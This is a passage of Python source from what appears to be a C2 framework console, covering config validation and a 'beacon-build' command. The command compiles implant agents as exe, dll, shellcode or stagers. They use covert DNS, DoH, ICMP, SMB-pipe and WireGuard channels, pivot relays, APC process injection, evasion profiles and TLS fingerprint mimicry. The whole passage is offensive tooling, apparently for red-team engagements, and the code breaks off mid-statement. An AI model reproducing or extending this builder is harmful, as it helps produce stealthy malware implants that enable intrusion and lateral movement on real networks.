            if relay_target and ':' not in relay_target:
                return None, (
                    "tcp_relay_target must be host:port")

        rev_listen = (raw.get('tcp_rev_listen') or '').strip()
        rev_token = (raw.get('tcp_rev_token') or '').strip()
        if rev_listen:
            if ':' not in rev_listen:
                return None, (
                    "tcp_rev_listen must be host:port")
            if not rev_token or len(rev_token) != 64:
                return None, (
                    "tcp_rev_listen requires tcp_rev_token "
                    "(64 hex characters)")
            try:
                bytes.fromhex(rev_token)
            except ValueError:
                return None, (
                    "tcp_rev_token must be valid hex")

        pivot_key_path = (raw.get('pivot_key_path') or '').strip()
        _is_pivot_parent = bool(
            relay_pipe
            or (raw.get('tcp_relay_target') or '')
            or rev_listen)
        _is_pivot_child = ('smb' in modes or 'tcp' in modes
                           or 'tcprev' in modes)
        if _is_pivot_parent and _is_pivot_child:
            return None, (
                "this config sets a parent-side relay field "
                "(smb_relay_pipe, tcp_relay_target, or "
                "tcp_rev_listen) on a build whose own transport "
                "is smb, tcp, or tcprev. A child build cannot "
                "also be a parent — the parent's relay rides on "
                "top of a normal transport (http, dns, doh, "
                "quic, websocket, or wireguard). Drop the relay "
                "field, or change transport_mode to a normal "
                "transport.")
        if (_is_pivot_parent or _is_pivot_child) and not pivot_key_path:
            role = []
            if _is_pivot_parent:
                role.append('pivot listener')
            if _is_pivot_child:
                role.append('pivot client')
            return None, (
                f"this config is a {'/'.join(role)} but "
                f"pivot_key_path is empty. Every SMB and TCP "
                f"build needs the engagement-wide pivot keypair. "
                f"Generate one with `beacon-build --pivot-key-gen` "
                f"and set pivot_key_path to its location.")

        target_os = raw.get('target_os') or 'linux'
        if target_os not in ('linux', 'windows'):
            return None, f'unsupported target_os: {target_os}'

        target_arch = raw.get('target_arch') or 'amd64'
        output_format = raw.get('output_format') or (
            'exe' if target_os == 'windows' else 'elf')
        if output_format not in ('exe', 'dll', 'elf',
                                 'shellcode', 'stager'):
            return None, (
                f"unknown output_format {output_format!r}; "
                f"valid: exe, dll, elf, shellcode, stager")

        if output_format == 'stager':
            if raw.get('mtls', {}).get('enabled'):
                return None, (
                    'output_format=stager does not support mTLS — '
                    'the stager has no client certificate path')
            if transport_mode != 'http':
                return None, (
                    f"output_format=stager requires "
                    f"transport_mode='http'; got "
                    f"{transport_mode!r}. Build a full agent for "
                    f"{transport_mode} and stage it separately.")

        dns_domain = raw.get('dns_domain') or ''
        dns_resolver = raw.get('dns_resolver') or ''
        if ('dns' in modes or 'doh' in modes) and not dns_domain:
            return None, (
                f"transport_mode includes "
                f"{'dns' if 'dns' in modes else 'doh'} but "
                f"dns_domain is empty")

        if 'icmp' in modes:
            if (raw.get('target_os') or 'linux') == 'windows':
                return None, (
                    "transport_mode 'icmp' is not supported on "
                    "Windows")
            if not (raw.get('icmp_host') or '').strip():
                return None, (
                    "transport_mode includes 'icmp' but "
                    "icmp_host is empty (set it to the C2's "
                    "public IPv4)")

        doh_resolver = (raw.get('doh_resolver') or '').strip()
        if doh_resolver and not doh_resolver.startswith('https://'):
            return None, (
                f"doh_resolver must be an https:// URL "
                f"(got {doh_resolver!r})")

        url = raw.get('url') or ''
        if 'http' in modes and not url:
            url = self._beacon_build_default_url()
        elif 'quic' in modes and not url:
            url = self._beacon_build_default_url(for_quic=True)
        elif 'websocket' in modes and not url:
            url = self._beacon_build_default_url()

        # --- mTLS -----------------------------------------------------
        mtls = raw.get('mtls') or {}
        if not isinstance(mtls, dict):
            return None, 'mtls must be an object'
        use_mtls = bool(mtls.get('enabled'))
        mtls_dir = mtls.get('dir') or None
        mtls_cert = mtls.get('cert') or None
        mtls_key = mtls.get('key') or None
        mtls_ca = mtls.get('ca') or None
        if any((mtls_cert, mtls_key, mtls_ca)):
            use_mtls = True

        # --- Path whitelist (remote only) -----------------------------
        if remote:
            for label, path in (
                    ('mtls.dir',      mtls_dir),
                    ('mtls.cert',     mtls_cert),
                    ('mtls.key',      mtls_key),
                    ('mtls.ca',       mtls_ca)):
                try:
                    self._check_build_path(path, label)
                except ValueError as exc:
                    return None, str(exc)
                if path and not os.path.isfile(
                        os.path.realpath(os.path.expanduser(path))):
                    return None, (
                        f"{label} path {path!r} does not exist "
                        f"on the server")

            agent_key_path = raw.get('agent_keypair_path') or ''
            if agent_key_path:
                try:
                    self._check_build_path(
                        agent_key_path, 'agent_keypair_path')
                except ValueError as exc:
                    return None, str(exc)
                if not os.path.isfile(
                        os.path.realpath(
                            os.path.expanduser(agent_key_path))):
                    return None, (
                        f"agent_keypair_path {agent_key_path!r} "
                        f"does not exist on the server")

            if pivot_key_path:
                expected = os.path.join('mtls_certs', 'pivot.pem')
                expected_real = os.path.realpath(expected)
                actual_real = os.path.realpath(
                    os.path.expanduser(pivot_key_path))
                if actual_real != expected_real:
                    return None, (
                        f"pivot_key_path must be "
                        f"{expected!r} on a remote build; got "
                        f"{pivot_key_path!r}. The team server "
                        f"administrator pins the pivot keypair "
                        f"at that path. Ask them to run "
                        f"`beacon-build --pivot-key-gen` on the "
                        f"server console if the file does not "
                        f"exist yet.")
                if not os.path.isfile(actual_real):
                    return None, (
                        f"pivot_key_path {pivot_key_path!r} "
                        f"does not exist on the server")

            c2p = raw.get('c2_profile') or ''
            if c2p and (os.sep in c2p or '/' in c2p):
                return None, (
                    'c2_profile must be a name, not a path')

        try:
            failover_after = max(
                0, int(raw.get('transport_failover_after', 3)))
        except (TypeError, ValueError):
            return None, (
                'transport_failover_after must be an integer '
                f'(got {raw.get("transport_failover_after")!r})')

        inject_method = (raw.get('inject_method')
                         or 'default').lower()
        if inject_method not in ('default', 'apc',
                                 'threadpool', 'fiber',
                                 'callback'):
            return None, (
                f"inject_method must be one of 'default', 'apc', "
                f"'threadpool', 'fiber', 'callback'; got "
                f"{inject_method!r}")
        if inject_method in ('threadpool', 'fiber'):
            return None, (
                f"inject_method {inject_method!r} is a "
                f"self-execution technique. Fibers and thread "
                f"pools are process-local and do not fit "
                f"`migrate <pid>`. Leave inject_method at "
                f"'default'.")
        if inject_method == 'callback':
            return None, (
                "inject_method 'callback' is not implemented. "
                "Leave inject_method at 'default', or use 'apc'.")
        if inject_method == 'apc':
            if (raw.get('target_os') or 'linux') != 'windows':
                return None, (
                    "inject_method='apc' requires "
                    "target_os='windows'")
            if not bool(raw.get('inject', False)):
                return None, (
                    "inject_method='apc' requires inject=True; "
                    "the APC backend queues the shellcode that the "
                    "injection pass embeds")

        return {
            'target_os':        target_os,
            'target_arch':      target_arch,
            'output_format':    output_format,
            'transport_mode':   transport_mode,
            'transport_failover_after': failover_after,
            'dns_domain':       dns_domain,
            'dns_resolver':     dns_resolver,
            'doh_resolver':     raw.get('doh_resolver') or '',
            'doh_host_header':  raw.get('doh_host_header') or '',
            'doh_user_agent':   raw.get('doh_user_agent') or '',
            'icmp_host':        raw.get('icmp_host') or '',
            'smb_pipe':         raw.get('smb_pipe') or '',
            'smb_relay_pipe':   raw.get('smb_relay_pipe') or '',
            'tcp_bind_addr':    raw.get('tcp_bind_addr') or '',
            'tcp_bind_token':   raw.get('tcp_bind_token') or '',
            'tcp_relay_target': raw.get('tcp_relay_target') or '',
            'tcp_relay_token':  raw.get('tcp_relay_token') or '',
            'tcp_rev_listen':   rev_listen,
            'tcp_rev_target':   raw.get('tcp_rev_target') or '',
            'tcp_rev_token':    rev_token,
            'pivot_key_path':   pivot_key_path,
            'wireguard_server_pubkey': (
                raw.get('wireguard_server_pubkey') or ''),
            'wireguard_server_addr': (
                raw.get('wireguard_server_addr') or ''),
            'wireguard_agent_privkey': (
                raw.get('wireguard_agent_privkey') or ''),
            'wireguard_tunnel_ip': (
                raw.get('wireguard_tunnel_ip') or ''),
            'wireguard_inner_port': (
                raw.get('wireguard_inner_port') or ''),
            'wireguard_server_tunnel_ip': (
                raw.get('wireguard_server_tunnel_ip') or ''),
            'url':              url,
            'profile_name':     profile_name,
            'kill_days':        int(raw.get('kill_days', 30)),
            'work_hours_start': raw.get('work_hours_start') or '08:00',
            'work_hours_end':   raw.get('work_hours_end') or '19:00',
            'tls_profile':      raw.get('tls_profile') or 'go',
            'c2_profile':       raw.get('c2_profile') or None,
            'use_mtls':         use_mtls,
            'mtls_dir':         mtls_dir,
            'mtls_cert':        mtls_cert,
            'mtls_key':         mtls_key,
            'mtls_ca':          mtls_ca,
            'stage_key_hex':    raw.get('stage_key_hex') or '',
            'stage_name':       raw.get('stage_name') or '',
            'inject':           bool(raw.get('inject', False)),
            'inject_method':    (raw.get('inject_method')
                                 or 'default'),
            'agent_keypair_path': raw.get('agent_keypair_path') or '',
            '_evasion_overrides': evasion,
        }, None

    # ------------------------------------------------------------------
    # beacon_build

    def beacon_build(self, cmd_parts):
        """Compile a beacon agent.

        Usage:
            beacon-build                          # interactive wizard
            beacon-build <os> <arch> [flags]      # non-interactive
            beacon-build -c <path>                # JSON config file
            beacon-build --pivot-key-gen [<path>] # generate pivot keypair

        Flags (non-interactive mode):

          Target and output:
            --format <exe|dll|elf|shellcode|stager>
            --transport <mode>[,<mode>...]        default: http
                One of: http, quic, websocket, dns, doh, icmp,
                smb, tcp, wireguard. Or a comma-separated failover
                list drawn from http, dns, doh.
            --failover-after <N>                  default: 3

          HTTP, QUIC, WebSocket:
            --url <https://host:port>
            --c2-profile <name>                   under profiles/c2/
            --tls-profile <go|chrome|firefox|safari>

          DNS and DoH:
            --dns-domain <zone>
            --dns-resolver <host:port>            dns only
            --doh-resolver <url>                  doh only
            --doh-host <host>                     doh only
            --doh-ua <ua>                         doh only

          ICMP (Linux target only):
            --icmp-host <ipv4>

          WireGuard:
            --wireguard-server-pubkey <base64>
            --wireguard-server-addr <host:port>
            --wireguard-agent-privkey <base64>
            --wireguard-tunnel-ip <ipv4>
            --wireguard-server-tunnel-ip <ipv4>   default: 10.99.0.1
            --wireguard-inner-port <n>            default: 8881

          SMB pivot (Windows target only):
            --smb-pipe <name>                     child side
            --smb-relay-pipe <name>               parent side

          TCP bind pivot:
            --tcp-bind <host:port>                child side
            --tcp-token <hex>                     child side, 64 hex
            --tcp-token-gen                       child side, generate
            --tcp-relay <host:port>               parent side
            --tcp-relay-token <hex>               parent side, must match
                                                  the child's --tcp-token

          Pivot keypair (required for every SMB and TCP build):
            --pivot-key <path>
            --pivot-key-gen [<path>]              standalone, no build

          Agent identity keypair:
            --agent-keypair-path <path>           default:
                                                  .keys/agent/agent_signing.key
                The ECDSA P-256 signing key embedded in the
                binary. The private half is what signs every
                result and the check-in identity; the public
                half is presented at first check-in and pinned
                by the server. Leave unset to use the
                deployment's default — the console and the
                remote build manager both point at the same
                file so a rebuild is idempotent. Point at a
                per-engagement file only when the engagement
                policy requires a key that does not survive
                across deployments.

          OPSEC and lifecycle:
            --profile <default|stealth|opsec|paranoid>
            --kill-days <N>                       default: 30
            --work-hours HH:MM-HH:MM | off
            --work-off
            --inject
            --verbose

          mTLS:
            --mtls
            --mtls-dir <dir>
            --mtls-cert / --mtls-key / --mtls-ca <path>

          Stager:
            --stage-name <name>                   required for stager
            --stage-key <hex>                     blank = auto
        """
        c = self.colors

        try:
            from .beacon.builder import (
                BeaconBuilder, BeaconBuildConfig, OPSEC_PROFILES,
            )
        except ImportError as exc:
            print(f"{c['red']}[BEACON-BUILD] builder unavailable: "
                  f"{exc}{c['end']}")
            print(f"{c['yellow']}Ensure the beacon/ package is present "
                  f"and `pip install flask cryptography` has been run."
                  f"{c['end']}")
            return

        args = cmd_parts[1:]

        # ---- `--pivot-key-gen` short-circuit ------------------------
        if args and args[0] in ('--pivot-key-gen', '--gen-pivot-key'):
            out_path = (args[1] if len(args) > 1
                        else os.path.join('mtls_certs', 'pivot.pem'))
            try:
                from .beacon.builder import generate_pivot_keypair
            except ImportError as exc:
                print(f"{c['red']}[BEACON-BUILD] cannot import "
                      f"generate_pivot_keypair: {exc}{c['end']}")
                return
            try:
                priv_b64, pub_b64 = generate_pivot_keypair(out_path)
            except RuntimeError as exc:
                print(f"{c['red']}[BEACON-BUILD] {exc}{c['end']}")
                return
            print(f"{c['green']}generated pivot keypair"
                  f"{c['end']}")
            print(f"  {c['dim']}file   :{c['end']} {out_path}")
            print(f"  {c['dim']}private:{c['end']} {priv_b64}")
            print(f"  {c['dim']}public :{c['end']} {pub_b64}")
            print()
            print(f"{c['yellow']}Pass the same file to every SMB "
                  f"and TCP build via --pivot-key. Treat the "
                  f"private half as a CA key: it authenticates "
                  f"every pivot listener to every pivot client."
                  f"{c['end']}")
            return

        # ---- Config-file path ---------------------------------------
        config_mode = False
        if args and args[0] in ('-c', '--config'):
            if len(args) < 2:
                print(f"{c['red']}[BEACON-BUILD] -c requires a "
                      f"path{c['end']}")
                return
            params, err = self._load_build_config(args[1])
            if err:
                print(f"{c['red']}[BEACON-BUILD] {err}{c['end']}")
                return
            config_mode = True
            args = []

        # ---- Parameter collection ----------------------------------
        if not config_mode and not args:
            params = self._beacon_build_interactive()
            if params is None:
                print(f"{c['yellow']}[BEACON-BUILD] Cancelled{c['end']}")
                return
        elif not config_mode:
            if len(args) < 2:
                print(f"{c['red']}Usage: beacon-build <os> <arch> "
                      f"[--format <fmt>] [--transport <mode>] "
                      f"[--url <url>] [--profile <name>] "
                      f"[--kill-days N] [--c2-profile <name>] "
                      f"[--tls-profile <go|chrome|firefox|safari>] "
                      f"[--work-hours HH:MM-HH:MM | off] "
                      f"[--wireguard-server-pubkey <b64>] "
                      f"[--wireguard-server-addr <host:port>] "
                      f"[--wireguard-agent-privkey <b64>] "
                      f"[--wireguard-tunnel-ip <ipv4>] "
                      f"[--dns-domain <zone>] [--icmp-host <ipv4>] "
                      f"[--mtls [--mtls-dir <dir>] "
                      f"[--mtls-cert <path>] [--mtls-key <path>] "
                      f"[--mtls-ca <path>]] "
                      f"[--verbose]{c['end']}")
                print(f"{c['yellow']}Run `help` from the console "
                      f"for the full flag list, or `beacon-build` "
                      f"with no arguments for the interactive "
                      f"wizard.{c['end']}")
                return

            target_os = args[0].lower()
            target_arch = args[1].lower()
            params = {
                'target_os':        target_os,
                'target_arch':      target_arch,
                'output_format':    'exe' if target_os == 'windows'
                                    else 'elf',
                'url':              self._beacon_build_default_url(),
                'transport_mode':   'http',
                'transport_failover_after': 3,
                'smb_pipe':         '',
                'smb_relay_pipe':   '',
                'tcp_bind_addr':    '',
                'tcp_bind_token':   '',
                'tcp_relay_target': '',
                'tcp_relay_token':  '',
                'tcp_rev_listen':   '',
                'tcp_rev_target':   '',
                'tcp_rev_token':    '',
                'pivot_key_path':   '',
                'dns_domain':       '',
                'dns_resolver':     '',
                'doh_resolver':     '',
                'doh_host_header':  '',
                'doh_user_agent':   '',
                'icmp_host':        '',
                'profile_name':     'default',
                'kill_days':        30,
                'use_mtls':         False,
                'c2_profile':       None,
                'tls_profile':      'go',
                'work_hours_start': '08:00',
                'work_hours_end':   '19:00',
                'mtls_dir':         None,
                'mtls_cert':        None,
                'mtls_key':         None,
                'mtls_ca':          None,
                'verbose':          False,
                'stage_key_hex':    '',
                'stage_name':       '',
                'inject':           False,
                'inject_method':    'default',
                'agent_keypair_path': '',
                'wireguard_server_pubkey': '',
                'wireguard_server_addr':   '',
                'wireguard_agent_privkey': '',
                'wireguard_tunnel_ip':     '',
                'wireguard_inner_port':    '',
                'wireguard_server_tunnel_ip': '',
            }

            i = 2
            while i < len(args):
                flag = args[i]
                val = args[i + 1] if i + 1 < len(args) else None
                if flag == '--format' and val:
                    params['output_format'] = val
                    i += 2
                elif flag == '--url' and val:
                    params['url'] = val
                    i += 2
                elif flag == '--profile' and val:
                    params['profile_name'] = val
                    i += 2
                elif flag == '--kill-days' and val:
                    try:
                        params['kill_days'] = int(val)
                    except ValueError:
                        print(f"{c['red']}Invalid --kill-days: {val}"
                              f"{c['end']}")
                        return
                    i += 2
                elif flag == '--mtls':
                    params['use_mtls'] = True
                    i += 1
                elif flag == '--c2-profile' and val:
                    params['c2_profile'] = val
                    i += 2
                elif flag == '--tls-profile' and val:
                    if val not in ('go', 'chrome', 'firefox',
                                   'safari'):
                        print(f"{c['red']}--tls-profile must be one "
                              f"of: go, chrome, firefox, safari "
                              f"(got {val}){c['end']}")
                        return
                    params['tls_profile'] = val
                    i += 2
                elif flag == '--work-hours' and val:
                    spec = val.strip().lower()
                    if spec in ('off', 'none', 'disable'):
                        params['work_hours_start'] = '00:00'
                        params['work_hours_end'] = '00:00'
                        i += 2
                        continue
                    if '-' not in spec:
                        print(f"{c['red']}--work-hours expects "
                              f"HH:MM-HH:MM or 'off'{c['end']}")
                        return
                    parts = spec.split('-', 1)
                    params['work_hours_start'] = parts[0].strip()
                    params['work_hours_end'] = parts[1].strip()
                    i += 2
                elif flag == '--work-off':
                    params['work_hours_start'] = '00:00'
                    params['work_hours_end'] = '00:00'
                    i += 1
                elif flag == '--mtls-dir' and val:
                    params['use_mtls'] = True
                    params['mtls_dir'] = val
                    i += 2
                elif flag == '--mtls-cert' and val:
                    params['use_mtls'] = True
                    params['mtls_cert'] = val
                    i += 2
                elif flag == '--mtls-key' and val:
                    params['use_mtls'] = True
                    params['mtls_key'] = val
                    i += 2
                elif flag == '--mtls-ca' and val:
                    params['use_mtls'] = True
                    params['mtls_ca'] = val
                    i += 2
                elif flag == '--stage-key' and val:
                    params['stage_key_hex'] = val
                    i += 2
                elif flag == '--stage-name' and val:
                    params['stage_name'] = val
                    i += 2
                elif flag == '--transport' and val:
                    modes = [m.strip().lower()
                             for m in val.split(',') if m.strip()]
                    if not modes or any(
                            m not in ('http', 'dns', 'doh',
                                      'icmp', 'smb', 'tcp',
                                      'tcprev', 'quic', 'websocket',
                                      'wireguard')
                            for m in modes):
                        print(f"{c['red']}--transport must be "
                              f"one or more of 'http', 'dns', "
                              f"'doh', 'icmp', 'smb', 'tcp', "
                              f"'tcprev', 'quic', 'websocket', "
                              f"'wireguard', comma-separated "
                              f"(got {val}){c['end']}")
                        return
                    if 'smb' in modes and len(modes) > 1:
                        print(f"{c['red']}--transport smb cannot "
                              f"be combined with other transports"
                              f"{c['end']}")
                        return
                    if 'tcp' in modes and len(modes) > 1:
                        print(f"{c['red']}--transport tcp cannot "
                              f"be combined with other transports"
                              f"{c['end']}")
                        return
                    if 'tcprev' in modes and len(modes) > 1:
                        print(f"{c['red']}--transport tcprev "
                              f"cannot be combined with other "
                              f"transports{c['end']}")
                        return
                    if 'quic' in modes and len(modes) > 1:
                        print(f"{c['red']}--transport quic cannot "
                              f"be combined with other transports "
                              f"in this version — build a "
                              f"separate binary for a QUIC "
                              f"failover ring{c['end']}")
                        return
                    params['transport_mode'] = ','.join(modes)
                    i += 2
                elif flag == '--smb-pipe' and val:
                    params['smb_pipe'] = val
                    i += 2
                elif flag == '--smb-relay-pipe' and val:
                    params['smb_relay_pipe'] = val
                    i += 2
                elif flag == '--pivot-key' and val:
                    params['pivot_key_path'] = val
                    i += 2
                elif flag == '--tcp-bind' and val:
                    params['tcp_bind_addr'] = val
                    i += 2
                elif flag == '--tcp-token' and val:
                    params['tcp_bind_token'] = val
                    i += 2
                elif flag == '--tcp-token-gen':
                    import secrets as _sec
                    tok = _sec.token_hex(32)
                    params['tcp_bind_token'] = tok
                    print(f"{c['cyan']}generated tcp_bind_token: "
                          f"{c['bold']}{tok}{c['end']}")
                    i += 1
                elif flag == '--tcp-relay' and val:
                    params['tcp_relay_target'] = val
                    i += 2
                elif flag == '--tcp-relay-token' and val:
                    params['tcp_relay_token'] = val
                    i += 2
                elif flag == '--tcp-rev-listen' and val:
                    params['tcp_rev_listen'] = val
                    i += 2
                elif flag == '--tcp-rev-target' and val:
                    params['tcp_rev_target'] = val
                    i += 2
                elif flag == '--tcp-rev-token' and val:
                    params['tcp_rev_token'] = val
                    i += 2
                elif flag == '--tcp-rev-token-gen':
                    import secrets as _sec
                    tok = _sec.token_hex(32)
                    params['tcp_rev_token'] = tok
                    print(f"{c['cyan']}generated tcp_rev_token: "
                          f"{c['bold']}{tok}{c['end']}")
                    i += 1
                elif flag == '--failover-after' and val:
                    try:
                        n = int(val)
                    except ValueError:
                        print(f"{c['red']}--failover-after must be "
                              f"an integer (got {val}){c['end']}")
                        return
                    if n < 0:
                        print(f"{c['red']}--failover-after must be "
                              f">= 0{c['end']}")
                        return
                    params['transport_failover_after'] = n
                    i += 2
                elif flag == '--dns-domain' and val:
                    params['dns_domain'] = val
                    i += 2
                elif flag == '--dns-resolver' and val:
                    params['dns_resolver'] = val
                    i += 2
                elif flag == '--doh-resolver' and val:
                    params['doh_resolver'] = val
                    i += 2
                elif flag == '--doh-host' and val:
                    params['doh_host_header'] = val
                    i += 2
                elif flag == '--doh-ua' and val:
                    params['doh_user_agent'] = val
                    i += 2
                elif flag == '--icmp-host' and val:
                    params['icmp_host'] = val
                    i += 2
                elif flag == '--verbose':
                    params['verbose'] = True
                    i += 1
                elif flag == '--inject':
                    params['inject'] = True
                    i += 1
                elif flag == '--inject-method' and val:
                    if val not in ('default', 'apc',
                                   'threadpool', 'fiber',
                                   'callback'):
                        print(f"{c['red']}--inject-method must be "
                              f"one of: default, apc, threadpool, "
                              f"fiber, callback (got {val})"
                              f"{c['end']}")
                        return
                    params['inject_method'] = val
                    i += 2
                elif flag == '--agent-keypair-path' and val:
                    params['agent_keypair_path'] = val
                    i += 2
                elif flag == '--wireguard-server-pubkey' and val:
                    params['wireguard_server_pubkey'] = val
                    i += 2
                elif flag == '--wireguard-server-addr' and val:
                    params['wireguard_server_addr'] = val
                    i += 2
                elif flag == '--wireguard-agent-privkey' and val:
                    params['wireguard_agent_privkey'] = val
                    i += 2
                elif flag == '--wireguard-tunnel-ip' and val:
                    params['wireguard_tunnel_ip'] = val
                    i += 2
                elif flag == '--wireguard-inner-port' and val:
                    params['wireguard_inner_port'] = val
                    i += 2
                elif flag == '--wireguard-server-tunnel-ip' and val:
                    params['wireguard_server_tunnel_ip'] = val
                    i += 2
                else:
                    print(f"{c['red']}Unknown flag: {flag}{c['end']}")
                    return

        # ---- Pipe-name validation for the wizard/flag paths --------
        _relay_pipe = (params.get('smb_relay_pipe') or '').strip()
        if _relay_pipe:
            for _ch in _relay_pipe:
                if not (_ch.isalnum() or _ch in '._-'):
                    print(f"{c['red']}[BEACON-BUILD] smb_relay_pipe "
                          f"{_relay_pipe!r} contains {_ch!r}; a "
                          f"relay pipe name may use only letters, "
                          f"digits, '.', '_' and '-'"
                          f"{c['end']}")
                    return
        _child_pipe = (params.get('smb_pipe') or '').strip()
        if _child_pipe:
            if _child_pipe.startswith('\\\\'):
                if '\\pipe\\' not in _child_pipe:
                    print(f"{c['red']}[BEACON-BUILD] smb_pipe "
                          f"{_child_pipe!r} looks like a UNC path "
                          f"but has no \\pipe\\ segment; expected "
                          f"\\\\HOST\\pipe\\NAME{c['end']}")
                    return
            else:
                for _ch in _child_pipe:
                    if not (_ch.isalnum() or _ch in '._-'):
                        print(f"{c['red']}[BEACON-BUILD] smb_pipe "
                              f"{_child_pipe!r} contains {_ch!r}; "
                              f"a bare pipe name may use only "
                              f"letters, digits, '.', '_' and '-'"
                              f"{c['end']}")
                        return

        # ---- Validate ----------------------------------------------
        if params['target_os'] not in ('linux', 'windows'):
            print(f"{c['red']}[BEACON-BUILD] Unsupported OS: "
                  f"{params['target_os']}{c['end']}")
            return

        profile_name = params['profile_name']
        if profile_name not in OPSEC_PROFILES:
            print(f"{c['red']}[BEACON-BUILD] Unknown profile "
                  f"'{profile_name}'. Available: "
                  f"{', '.join(OPSEC_PROFILES.keys())}{c['end']}")
            return

        if config_mode:
            ev = params.get('_evasion_overrides') or {}
            print(f"{c['cyan']}[BEACON-BUILD] config mode — "
                  f"profile={profile_name}{c['end']}")
            for key in sorted(ev):
                print(f"{c['dim']}  {key} = {ev[key]!r}{c['end']}")

        source_dir, output_dir = self._beacon_build_dir()
        if not os.path.isdir(source_dir):
            print(f"{c['red']}[BEACON-BUILD] Agent source not found at "
                  f"{source_dir}{c['end']}")
            return

        os.makedirs(output_dir, exist_ok=True)

        # ---- Build config ------------------------------------------
        base = OPSEC_PROFILES[profile_name]
        cfg = BeaconBuildConfig(**dict(base.__dict__))
        cfg.url = params['url']
        cfg.profile_name = profile_name
        cfg.kill_days = params['kill_days']
        cfg.target_os = params['target_os']
        cfg.target_arch = params['target_arch']
        cfg.output_format = params['output_format']
        cfg.tls_profile = params.get('tls_profile') or 'go'
        cfg.work_hours_start = (
            params.get('work_hours_start') or '08:00')
        cfg.work_hours_end = (
            params.get('work_hours_end') or '19:00')
        cfg.verbose = bool(params.get('verbose', False))

        cfg.transport_mode = params.get('transport_mode') or 'http'
        cfg.transport_failover_after = int(
            params.get('transport_failover_after', 3))
        cfg.dns_domain = params.get('dns_domain') or ''
        cfg.dns_resolver = params.get('dns_resolver') or ''
        cfg.doh_resolver = params.get('doh_resolver') or ''
        cfg.doh_host_header = params.get('doh_host_header') or ''
        cfg.doh_user_agent = params.get('doh_user_agent') or ''
        cfg.icmp_host = params.get('icmp_host') or ''
        cfg.smb_pipe = params.get('smb_pipe') or ''
        cfg.smb_relay_pipe = params.get('smb_relay_pipe') or ''
        cfg.tcp_bind_addr = params.get('tcp_bind_addr') or ''
        cfg.tcp_bind_token = params.get('tcp_bind_token') or ''
        cfg.tcp_relay_target = params.get('tcp_relay_target') or ''
        cfg.tcp_relay_token = params.get('tcp_relay_token') or ''
        cfg.tcp_rev_listen = params.get('tcp_rev_listen') or ''
        cfg.tcp_rev_target = params.get('tcp_rev_target') or ''
        cfg.tcp_rev_token = params.get('tcp_rev_token') or ''
        cfg.wireguard_server_pubkey = (
            params.get('wireguard_server_pubkey') or '')
        cfg.wireguard_server_addr = (
            params.get('wireguard_server_addr') or '')
        cfg.wireguard_agent_privkey = (
            params.get('wireguard_agent_privkey') or '')
        cfg.wireguard_tunnel_ip = (
            params.get('wireguard_tunnel_ip') or '')
        cfg.wireguard_inner_port = (
            params.get('wireguard_inner_port') or '')
        cfg.wireguard_server_tunnel_ip = (
            params.get('wireguard_server_tunnel_ip') or '')
        cfg.pivot_key_path = params.get('pivot_key_path') or ''
        cfg.stage_key_hex = params.get('stage_key_hex') or ''
        cfg.stage_name = params.get('stage_name') or ''
        cfg.inject = bool(params.get('inject', False))
        cfg.inject_method = params.get('inject_method') or 'default'
        ev = params.get('_evasion_overrides') or {}
        for key, value in ev.items():
            if hasattr(cfg, key):
                setattr(cfg, key, value)

        _modes = [m.strip() for m in cfg.transport_mode.split(',')
                  if m.strip()]
        if ('dns' in _modes or 'doh' in _modes) \
                and not cfg.dns_domain:
            print(f"{c['red']}[BEACON-BUILD] "
                  f"--transport "
                  f"{'dns' if 'dns' in _modes else 'doh'} "
                  f"requires --dns-domain{c['end']}")
            return
        if 'icmp' in _modes:
            if cfg.target_os == 'windows':
                print(f"{c['red']}[BEACON-BUILD] --transport icmp "
                      f"is not supported on Windows{c['end']}")
                return
            if not cfg.icmp_host:
                print(f"{c['red']}[BEACON-BUILD] --transport icmp "
                      f"requires --icmp-host{c['end']}")
                return
        if 'websocket' in _modes and not cfg.url:
            print(f"{c['red']}[BEACON-BUILD] --transport websocket "
                  f"requires --url "
                  f"(https://host:port; the client converts to "
                  f"wss:// automatically){c['end']}")
            return
        if 'tcprev' in _modes:
            if not cfg.tcp_rev_target:
                print(f"{c['red']}[BEACON-BUILD] --transport "
                      f"tcprev requires --tcp-rev-target"
                      f"{c['end']}")
                return
            if not cfg.tcp_rev_token:
                print(f"{c['red']}[BEACON-BUILD] --transport "
                      f"tcprev requires --tcp-rev-token"
                      f"{c['end']}")
                return
            if len(cfg.tcp_rev_token) != 64:
                print(f"{c['red']}[BEACON-BUILD] tcp_rev_token "
                      f"must be 64 hex characters{c['end']}")
                return
            try:
                bytes.fromhex(cfg.tcp_rev_token)
            except ValueError:
                print(f"{c['red']}[BEACON-BUILD] tcp_rev_token "
                      f"must be valid hex{c['end']}")
                return
        if cfg.tcp_rev_listen:
            if ':' not in cfg.tcp_rev_listen:
                print(f"{c['red']}[BEACON-BUILD] --tcp-rev-listen "
                      f"must be host:port{c['end']}")
                return
            if not cfg.tcp_rev_token:
                print(f"{c['red']}[BEACON-BUILD] --tcp-rev-listen "
                      f"requires --tcp-rev-token{c['end']}")
                return
            if len(cfg.tcp_rev_token) != 64:
                print(f"{c['red']}[BEACON-BUILD] tcp_rev_token "
                      f"must be 64 hex characters{c['end']}")
                return
            try:
                bytes.fromhex(cfg.tcp_rev_token)
            except ValueError:
                print(f"{c['red']}[BEACON-BUILD] tcp_rev_token "
                      f"must be valid hex{c['end']}")
                return
        if 'wireguard' in _modes:
            for flag, field in (
                    ('--wireguard-server-pubkey',
                     cfg.wireguard_server_pubkey),
                    ('--wireguard-server-addr',
                     cfg.wireguard_server_addr),
                    ('--wireguard-agent-privkey',
                     cfg.wireguard_agent_privkey),
                    ('--wireguard-tunnel-ip',
                     cfg.wireguard_tunnel_ip)):
                if not (field or '').strip():
                    print(f"{c['red']}[BEACON-BUILD] --transport "
                          f"wireguard requires {flag}{c['end']}")
                    return

        _default_agent_key = os.path.normpath(os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            '..', '.keys', 'agent', 'agent_signing.key'))
        _configured_key = (params.get('agent_keypair_path')
                           or '').strip()
        if _configured_key:
            cfg.agent_keypair_path = os.path.expanduser(
                _configured_key)
        else:
            cfg.agent_keypair_path = _default_agent_key
        _keydir = os.path.dirname(cfg.agent_keypair_path)
        if _keydir:
            os.makedirs(_keydir, mode=0o700, exist_ok=True)

        if self.server_ecdh is not None:
            cfg.server_ecdh_pubkey_b64 = self.server_ecdh.public_b64
        else:
            print(f"{c['yellow']}[BEACON-BUILD] wire encryption "
                  f"unavailable — the built agent will send "
                  f"plaintext{self.colors['end']}")

        pubkey_tmp = None
        if self.signer is not None:
            try:
                import tempfile
                tf = tempfile.NamedTemporaryFile(
